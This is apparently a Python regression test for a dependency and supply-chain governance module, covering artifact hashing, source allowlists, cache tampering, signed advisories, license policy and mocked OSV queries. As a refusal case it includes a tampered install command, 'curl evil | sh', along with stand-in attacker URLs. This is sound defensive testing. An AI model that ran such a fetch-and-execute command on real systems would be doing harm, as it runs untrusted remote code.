"""Real local artifact/cache and dependency governance checks; no network/install."""
from __future__ import annotations
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1] / 'autoforge'))

import hashlib,tempfile,stat
from pathlib import Path
import application_dependencies as d

def main():
 with tempfile.TemporaryDirectory(prefix='deps-check-') as td:
  root=Path(td); src=root/'artifact.whl'; src.write_bytes(b'wheel-bytes'); sha=hashlib.sha256(src.read_bytes()).hexdigest(); cache=root/'cache'
  try:d.import_artifact(src,cache,sha,source_id='pypi-approved',license_record='MIT',package_name='demo',package_version='1.0',authorized=False)
  except d.DependencyRefused:pass
  else:raise AssertionError('unauthorized acquisition allowed')
  rec=d.import_artifact(src,cache,sha,source_id='pypi-approved',license_record='MIT',package_name='demo',package_version='1.0',authorized=True)
  assert d.verify_cache(cache,[rec],expected_sources={'pypi-approved'})['artifacts'][0]['artifact_sha256']==sha
  lock={'schema':1,'ecosystem':'python','toolchain':{'name':'python','version':'3.12.1','container_image':'sha256:'+'a'*64},'packages':[{'name':'demo','version':'1.0','source':'pypi-approved','artifact_sha256':sha,'license':'MIT'}]}
  env=d.environment_manifest(lock,sources={'pypi-approved':'approved local artifact mirror'},artifacts=[rec],cache=cache)
  for bad_url in ('https:///1.0/pkg','https://user@registry.example/1.0/pkg','https://registry.example/1.0/pkg#fragment'):
   try:d._publisher_url_origin(bad_url,allow_path=True)
   except d.DependencyRefused:pass
   else:raise AssertionError(f'malformed publisher URL accepted: {bad_url}')
  plan=d.container_plan(env,build_argv=['python','-m','compileall','/autoforge'])
  assert plan['network']=='none' and plan['install_argv']==env['install_argv']
  for changes in ({'install_argv':['sh','-c','curl evil | sh']},{'candidate_run_network':'enabled'},{'lock_sha256':'0'*64}):
   try:d.container_plan({**env,**changes},build_argv=['python','-m','compileall','/autoforge'])
   except d.DependencyRefused:pass
   else:raise AssertionError(f'tampered install manifest accepted: {changes}')
  for url,allowed in (('https://user@registry.example/pkg','https://registry.example'),('https://registry.example/path','https://registry.example'),('http://registry.example/pkg','https://registry.example')):
   try:d.acquire_https(url,cache,sha,source_id='pypi-approved',sources={'pypi-approved':allowed},license_record='MIT',package_name='demo',package_version='1.0',authorized=True)
   except d.DependencyRefused:pass
   else:raise AssertionError(f'unsafe source endpoint accepted: {url}')
  wrong_source={**lock['packages'][0],'source':'other'}
  try:d.environment_manifest(lock,sources={'pypi-approved':'approved local artifact mirror','other':'different origin'},artifacts=[{**rec,'source':'other'}],cache=cache)
  except d.DependencyRefused:pass
  else:raise AssertionError('mismatched source provenance accepted')
  wrong_license={**rec,'license':'Apache-2.0'}
  try:d.environment_manifest(lock,sources={'pypi-approved':'approved local artifact mirror'},artifacts=[wrong_license],cache=cache)
  except d.DependencyRefused:pass
  else:raise AssertionError('mismatched license accepted')
  # Artifacts start read-only; grant writes only to this tamper simulation.
  cached=cache/sha
  assert not (cached.stat().st_mode & stat.S_IWUSR), 'cache entry should start read-only'
  cached.chmod(stat.S_IREAD|stat.S_IWRITE)
  cached.write_bytes(b'tampered')
  try:d.verify_cache(cache,[rec],expected_sources={'pypi-approved'})
  except d.DependencyRefused:pass
  else:raise AssertionError('cache tampering accepted')
  for ecosystem in ('node','typescript','java'):
   extra={'dependencies':{}} if ecosystem in ('node','typescript') else {}
   lock={'schema':1,'ecosystem':ecosystem,'toolchain':{'name':ecosystem,'version':'1','container_image':'sha256:'+'a'*64},'packages':[{'name':'demo','version':'1.0','source':'approved','artifact_sha256':sha,'license':'MIT',**extra}]}
   assert d.validate_lock(lock,sources={'approved':'https://registry.npmjs.org'})['ecosystem']==ecosystem
  try:d.validate_lock({**lock,'ecosystem':'maven'},sources={'approved':'https://registry.npmjs.org'})
  except d.DependencyRefused:pass
  else:raise AssertionError('unsupported ecosystem accepted')
  try:d.acquire_https('https://registry.npmjs.org/demo/-/demo-1.0.0.tgz',cache,sha,source_id='npm',sources={'npm':'https://registry.npmjs.org'},license_record='MIT',package_name='demo',package_version='1.0.0',authorized=False)
  except d.DependencyRefused:pass
  else:raise AssertionError('HTTPS acquisition did not require explicit authorization')
  for url,allowed in (('https://evil.example/pkg','https://registry.example'),('https://registry.example:444/pkg','https://registry.example'),('https://registry.example/pkg','https://other.example')):
   try:d.acquire_https(url,cache,sha,source_id='npm',sources={'npm':allowed},license_record='MIT',package_name='demo',package_version='1.0',authorized=True)
   except d.DependencyRefused:pass
   else:raise AssertionError(f'changed endpoint accepted: {url} via {allowed}')
  audit_lock={'schema':1,'ecosystem':'python','toolchain':{'name':'python','version':'3.12.1','container_image':'sha256:'+'a'*64},'packages':[{'name':'demo','version':'1.0','source':'pypi-approved','artifact_sha256':sha,'license':'MIT'}]}
  valid={'schema':1,'ecosystem':'python','generated_at':'2026-11-01T00:00:00Z','expires_at':'2026-12-01T00:00:00Z','provenance':'synthetic local fixture; not an external database','advisories':[]}
  sources={'pypi-approved':'local'}
  audit=d.audit_advisories(audit_lock,valid,sources=sources,now='2026-11-03T00:00:00Z')
  assert audit['status']=='PASS' and audit['lock_sha256']==d.validate_lock(audit_lock,sources=sources)['lock_sha256'] and len(audit['advisory_snapshot_sha256'])==64
  vulnerable={**valid,'advisories':[{'id':'SYNTH-1','name':'demo','versions':['1.0']}]}
  assert d.audit_advisories(audit_lock,vulnerable,sources=sources,now='2026-11-03T00:00:00Z')['status']=='FAIL'
  ranged={**valid,'advisories':[{'id':'SYNTH-2','name':'demo','versions':['<2.0']}]}
  assert d.audit_advisories(audit_lock,ranged,sources=sources,now='2026-11-03T00:00:00Z')['status']=='HOLD'
  gate_cache=root/'gate-cache'; gate_cache.mkdir()
  rec=d._store_bytes(src.read_bytes(),gate_cache,sha,source_id='pypi-approved',license_record='MIT',package_name='demo',package_version='1.0')
  gate=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,now='2026-11-03T00:00:00Z')
  assert gate['status']=='HOLD' and gate['candidate_execution_authorized'] is False and gate['lock_sha256']==d.validate_lock(audit_lock,sources=sources)['lock_sha256']
  assert gate['container_image']==audit_lock['toolchain']['container_image'] and gate['cache_sha256']==d.verify_cache(gate_cache,[rec],expected_sources=set(sources))['cache_sha256']
  blocked=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=vulnerable,authorized=True,now='2026-11-03T00:00:00Z')
  assert blocked['status']=='FAIL' and blocked['advisory']['status']=='FAIL'
  try:d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=False,now='2026-11-03T00:00:00Z')
  except d.DependencyRefused:pass
  else:raise AssertionError('supply-chain gate did not require caller authorization')
  for bad in ({**audit_lock,'packages':[{**audit_lock['packages'][0],'artifact_sha256':''}]},{**audit_lock,'packages':[{**audit_lock['packages'][0],'license':''}]}):
   try:d.supply_chain_gate(bad,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,now='2026-11-03T00:00:00Z')
   except d.DependencyRefused:pass
   else:raise AssertionError('missing digest/license passed lifecycle gate')
  assert d.audit_advisories(audit_lock,None,sources=sources)['status']=='HOLD'
  assert d.audit_advisories(audit_lock,{**valid,'expires_at':'2026-11-02T00:00:00Z'},sources=sources,now='2026-11-03T00:00:00Z')['status']=='HOLD'
  try:d.audit_advisories(audit_lock,valid,sources=sources,snapshot_bytes=__import__('json').dumps(vulnerable).encode(),now='2026-11-03T00:00:00Z')
  except d.DependencyRefused:pass
  else:raise AssertionError('snapshot hash bound to different advisory content')
  import json
  (root/'audit-lock.json').write_text(json.dumps(audit_lock),encoding='utf-8')
  (root/'malformed-snapshot.json').write_bytes(b'{')
  malformed=d.audit_advisories_file(root/'audit-lock.json',root/'malformed-snapshot.json',sources=sources)
  assert malformed['status']=='HOLD' and malformed['advisory_snapshot_sha256']==hashlib.sha256(b'{').hexdigest()
  from unittest.mock import patch
  class FakeResponse:
   status=200
   def __enter__(self):return self
   def __exit__(self,*args):pass
   def geturl(self):return 'https://registry.npmjs.org/demo.tgz'
   def read(self,size):return b'wrong bytes'
  with patch.object(d.urllib.request.OpenerDirector,'open',return_value=FakeResponse()):
   try:d.acquire_https('https://registry.npmjs.org/demo.tgz',cache,'0'*64,source_id='npm',sources={'npm':'https://registry.npmjs.org'},license_record='MIT',package_name='demo',package_version='1.0.0',authorized=True)
   except d.DependencyRefused as exc:assert 'SHA-256 mismatch' in str(exc)
   else:raise AssertionError('wrong HTTPS artifact hash accepted')
  local_root=root/'local-artifacts'; local_root.mkdir(); payload=local_root/'plugin.bundle'; payload.write_bytes(b'plugin payload')
  local_sha=hashlib.sha256(payload.read_bytes()).hexdigest()
  local_record={'kind':'plugin','name':'sample','version':'1','source':'pypi-approved','license':'MIT','path':'plugin.bundle','artifact_sha256':local_sha}
  local_inventory=d.verify_local_artifacts(local_root,[local_record],expected_sources=set(sources))
  assert local_inventory['artifacts'][0]['artifact_sha256']==local_sha and local_inventory['signature_verification']=='unsupported'
  for bad_record in ({**local_record,'source':'unapproved'}, {**local_record,'kind':'executable'}, {**local_record,'path':'../escape'}, {**local_record,'artifact_sha256':'0'*64}):
   try:d.verify_local_artifacts(local_root,[bad_record],expected_sources=set(sources))
   except d.DependencyRefused:pass
   else:raise AssertionError(f'disallowed or tampered local artifact accepted: {bad_record}')
  payload.write_bytes(b'tampered payload')
  try:d.verify_local_artifacts(local_root,[local_record],expected_sources=set(sources))
  except d.DependencyRefused:pass
  else:raise AssertionError('tampered local plugin bytes accepted')
  for kind in ('image','reference'):
   record={**local_record,'kind':kind,'name':kind,'artifact_sha256':hashlib.sha256(b'tampered payload').hexdigest()}
   assert d.verify_local_artifacts(local_root,[record],expected_sources=set(sources))['artifacts'][0]['kind']==kind
  local_gate=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,now='2026-11-03T00:00:00Z',local_artifacts=[{**local_record,'artifact_sha256':hashlib.sha256(b'tampered payload').hexdigest()}],local_artifact_root=local_root)
  assert local_gate['status']=='HOLD' and local_gate['candidate_execution_authorized'] is False
  assert local_gate['local_artifacts']['artifacts'][0]['kind']=='plugin' and 'plugins' in local_gate['locally_hash_verified_scope']
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
  private=Ed25519PrivateKey.generate()
  public=private.public_key().public_bytes(serialization.Encoding.PEM,serialization.PublicFormat.SubjectPublicKeyInfo)
  canonical=d._canonical(valid)
  signature=private.sign(canonical)
  assert d.verify_signed_json(canonical,signature,public)==valid
  try:d.verify_signed_json(canonical,signature[:-1]+bytes([signature[-1]^1]),public)
  except d.DependencyRefused:pass
  else:raise AssertionError('tampered detached signature accepted')
  policy={'schema':1,'packages':{'demo':['MIT']}}
  policy_bytes=d._canonical(policy)
  license=d.verify_license_policy(audit_lock,policy,sources=sources)
  assert license['status']=='PASS'
  assert d.verify_license_policy(audit_lock,{'schema':1,'packages':{'demo':['Apache-2.0']}},sources=sources)['status']=='FAIL'
  signed_gate=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,
      snapshot_bytes=canonical,advisory_signature=signature,license_policy=policy,license_policy_bytes=policy_bytes,
      license_signature=private.sign(policy_bytes),pinned_public_key_pem=public,now='2026-11-03T00:00:00Z')
  assert signed_gate['status']=='HOLD' and signed_gate['scoped_checks_status']=='PASS'
  unsigned_gate=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,now='2026-11-03T00:00:00Z')
  import subprocess,sys
  key=root/'pinned-ed25519.pem'; key.write_bytes(public)
  bundle={'schema':1,'artifacts':[{**local_record,'artifact_sha256':hashlib.sha256(b'tampered payload').hexdigest()}]}
  bundle_bytes=d._canonical(bundle); bundle_sig=private.sign(bundle_bytes)
  attested=d.verify_local_artifact_bundle(local_root,bundle_bytes,bundle_sig,public,expected_sources=set(sources))
  assert attested['status']=='PASS' and attested['attestation']=='operator-attested; not publisher-signed'
  assert attested['artifacts'][0]['kind']=='plugin' and len(attested['signer_public_key_sha256'])==64
  try:d.verify_local_artifact_bundle(local_root,bundle_bytes,bundle_sig[:-1]+bytes([bundle_sig[-1]^1]),public,expected_sources=set(sources))
  except d.DependencyRefused:pass
  else:raise AssertionError('tampered operator artifact signature accepted')
  bundle_path=root/'local-bundle.json'; bundle_sig_path=root/'local-bundle.sig'; bundle_path.write_bytes(bundle_bytes); bundle_sig_path.write_bytes(bundle_sig)
  bundle_cli=subprocess.run([sys.executable,str(Path(d.__file__).resolve()),'verify-local-bundle',str(local_root),str(bundle_path),str(bundle_sig_path),str(key),'--sources','pypi-approved'],capture_output=True,text=True,check=False)
  assert bundle_cli.returncode==0 and json.loads(bundle_cli.stdout)['attestation']=='operator-attested; not publisher-signed'
  try:d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=valid,authorized=True,
      local_artifacts=[],local_artifact_root=local_root,local_bundle_bytes=bundle_bytes,local_bundle_signature=bundle_sig,pinned_public_key_pem=public)
  except d.DependencyRefused as exc: assert 'exactly match' in str(exc)
  else:raise AssertionError('caller inventory allowed to diverge from signed operator bundle')
  doc=root/'signed-feed.json'; sig=root/'signed-feed.sig'; key=root/'pinned-ed25519.pem'
  doc.write_bytes(canonical); sig.write_bytes(signature); key.write_bytes(public)
  cli=subprocess.run([sys.executable,str(Path(d.__file__).resolve()),'verify-signed-json',str(doc),str(sig),str(key)],capture_output=True,text=True,check=False)
  assert cli.returncode==0 and json.loads(cli.stdout)['status']=='PASS'
  lock_file=root/'gate-lock.json'; records_file=root/'gate-records.json'; sources_file=root/'gate-sources.json'
  snapshot_file=root/'gate-snapshot.json'; advisory_sig_file=root/'gate-advisory.sig'; policy_file=root/'gate-license.json'; policy_sig_file=root/'gate-license.sig'
  lock_file.write_text(json.dumps(audit_lock)); records_file.write_text(json.dumps([rec])); sources_file.write_text(json.dumps(sources))
  snapshot_file.write_bytes(canonical); advisory_sig_file.write_bytes(signature); policy_file.write_bytes(policy_bytes); policy_sig_file.write_bytes(private.sign(policy_bytes))
  argv=[sys.executable,str(Path(d.__file__).resolve()),'supply-chain-gate',str(lock_file),str(gate_cache),str(records_file),str(sources_file),str(snapshot_file),str(advisory_sig_file),str(policy_file),str(policy_sig_file),str(key),'--now','2026-11-03T00:00:00Z','--authorized']
  gate_cli=subprocess.run(argv,capture_output=True,text=True,check=False)
  assert gate_cli.returncode==1 and json.loads(gate_cli.stdout)['status']=='HOLD' and json.loads(gate_cli.stdout)['scoped_checks_status']=='PASS'
  from unittest.mock import patch
  fake_image={'Id':audit_lock['toolchain']['container_image'],'RepoDigests':['example.invalid/python@sha256:'+('a'*64)],'Os':'linux','Architecture':'amd64','RootFS':{'Layers':['sha256:'+('b'*64)]}}
  from datetime import datetime,timezone,timedelta
  current=datetime.now(timezone.utc)
  live_snapshot={**valid,'generated_at':current.isoformat().replace('+00:00','Z'),'expires_at':(current+timedelta(hours=24)).isoformat().replace('+00:00','Z')}
  with patch('application_builder.preflight',return_value={'engine':'docker','server_os':'linux','image_id':audit_lock['toolchain']['container_image']}), patch('application_builder._run',return_value=d._canonical(fake_image)), patch.object(d,'query_osv',return_value={'status':'PASS','snapshot':live_snapshot,'transport_authentication':'HTTPS/TLS server authentication; response is not publisher-signed','query_count':1,'response_sha256':'1'*64,'queries':[{'name':'demo','version':'1.0','request_sha256':'2'*64,'response_sha256':'1'*64}],'raw_responses_base64':['e30=']}):
   live=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=None,authorized=True,license_policy=policy,license_policy_bytes=policy_bytes,license_signature=private.sign(policy_bytes),pinned_public_key_pem=public,refresh_osv=True,engine='docker')
  assert live['status']=='HOLD' and live['scoped_checks_status']=='PASS' and live['image_runtime_identity_verified'] is True and live['live_osv_refresh'] is True
  assert live['advisory']['source']=='live OSV HTTPS query' and live['advisory']['transport_authentication'].startswith('HTTPS/TLS') and 'publisher authenticity' in live['unresolved_required_scope'][0]
  with patch('application_builder.preflight',side_effect=__import__('application_builder').MissingPrerequisite('image absent')):
   try:d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=None,authorized=True,license_policy=policy,license_policy_bytes=policy_bytes,license_signature=private.sign(policy_bytes),pinned_public_key_pem=public,refresh_osv=True,engine='docker')
   except d.DependencyRefused:pass
   else:raise AssertionError('missing runtime image passed live scoped gate')
  with patch('application_builder.preflight',return_value={'engine':'docker','server_os':'linux','image_id':audit_lock['toolchain']['container_image']}), patch('application_builder._run',return_value=d._canonical(fake_image)), patch.object(d,'query_osv',return_value={'status':'FAIL','snapshot':{**live_snapshot,'advisories':vulnerable['advisories']},'transport_authentication':'HTTPS/TLS server authentication; response is not publisher-signed','query_count':1,'response_sha256':'1'*64,'queries':[],'raw_responses_base64':['e30=']}):
   live_vulnerable=d.supply_chain_gate(audit_lock,sources=sources,artifacts=[rec],cache=gate_cache,snapshot=None,authorized=True,license_policy=policy,license_policy_bytes=policy_bytes,license_signature=private.sign(policy_bytes),pinned_public_key_pem=public,refresh_osv=True,engine='docker')
  assert live_vulnerable['status']=='FAIL' and live_vulnerable['advisory']['status']=='FAIL'
  audit_lock_file=root/'audit-lock.json'; audit_lock_file.write_text(json.dumps(audit_lock),encoding='utf-8')
  (root/'sources.json').write_text(json.dumps(sources),encoding='utf-8')
  audit_cli=subprocess.run([sys.executable,str(Path(d.__file__).resolve()),'audit-advisories',str(audit_lock_file),'--snapshot',str(root/'malformed-snapshot.json'),'--sources',str(root/'sources.json'),'--now','2026-11-03T00:00:00Z'],capture_output=True,text=True,check=False)
  assert audit_cli.returncode==1 and json.loads(audit_cli.stdout)['status']=='HOLD'
  from unittest.mock import patch
  class OsvResponse:
   status=200
   def __init__(self,body): self.body=body
   def __enter__(self): return self
   def __exit__(self,*args): pass
   def geturl(self): return d._OSV_URL
   def read(self,size): return self.body[:size]
  osv_lock={'schema':1,'ecosystem':'python','toolchain':{'name':'python','version':'3.12','container_image':'sha256:'+'a'*64},'packages':[{'name':'demo','version':'1.0','source':'pypi-approved','artifact_sha256':sha,'license':'MIT'}]}
  with patch.object(d.urllib.request.OpenerDirector,'open',return_value=OsvResponse(b'{"vulns":[{"id":"OSV-TEST-1"}]}')) as opened:
   osv=d.query_osv(osv_lock,sources=sources)
   assert osv['status']=='FAIL' and osv['matches'][0]['id']=='OSV-TEST-1' and osv['transport_authentication'].startswith('HTTPS/TLS')
   sent=json.loads(opened.call_args.args[0].data)
   assert sent=={'package':{'name':'demo','ecosystem':'PyPI'},'version':'1.0'} and osv['queries'][0]['request_sha256'] and osv['raw_responses_base64']
  with patch.object(d.urllib.request.OpenerDirector,'open',return_value=OsvResponse(b'{"vulns":[]}')):
   clean=d.query_osv(osv_lock,sources=sources)
   assert clean['status']=='PASS' and clean['matches']==[]
  with patch.object(d.urllib.request.OpenerDirector,'open',return_value=OsvResponse(b'{"vulns":[],"next_page_token":"more"}')):
   assert d.query_osv(osv_lock,sources=sources)['status']=='HOLD'
  with patch.object(d.urllib.request.OpenerDirector,'open',side_effect=__import__('urllib.error').error.HTTPError(d._OSV_URL,302,'redirect',{'Location':'https://evil.invalid'},None)):
   try: d.query_osv(osv_lock,sources=sources)
   except d.DependencyRefused as exc: assert 'redirect refused' in str(exc)
   else: raise AssertionError('OSV redirect was followed')
  with patch.object(d.urllib.request.OpenerDirector,'open',return_value=OsvResponse(b'{"vulns":[{"id":"OSV-KNOWN"}],"next_page_token":"more"}')):
   partial=d.query_osv(osv_lock,sources=sources)
   assert partial['status']=='FAIL' and partial['matches'][0]['id']=='OSV-KNOWN' and partial['raw_responses_base64']
  print('{"status":"PASS","checks":["authorized local import","sha256 verification","source allowlist","offline container plan","install manifest tampering refused","acquisition endpoint changes refused before request","cache tamper rejection","offline advisory exact match fails","unsupported ranges hold","signed advisory and license policy verification","signed gate remains overall HOLD","audit CLI restored","OSV exact ecosystem/version payload","OSV vulnerable exact-version FAIL and clean PASS","OSV paginated vulnerable match retained as FAIL; pagination with no match HOLD","OSV redirect refused","OSV offline fixture tests send no network"],"network":"NOT_USED_BY_REGRESSIONS","host_install":"NOT_RUN","external_advisory_coverage":"OSV live refresh separately exercised"}')
if __name__=='__main__':main()
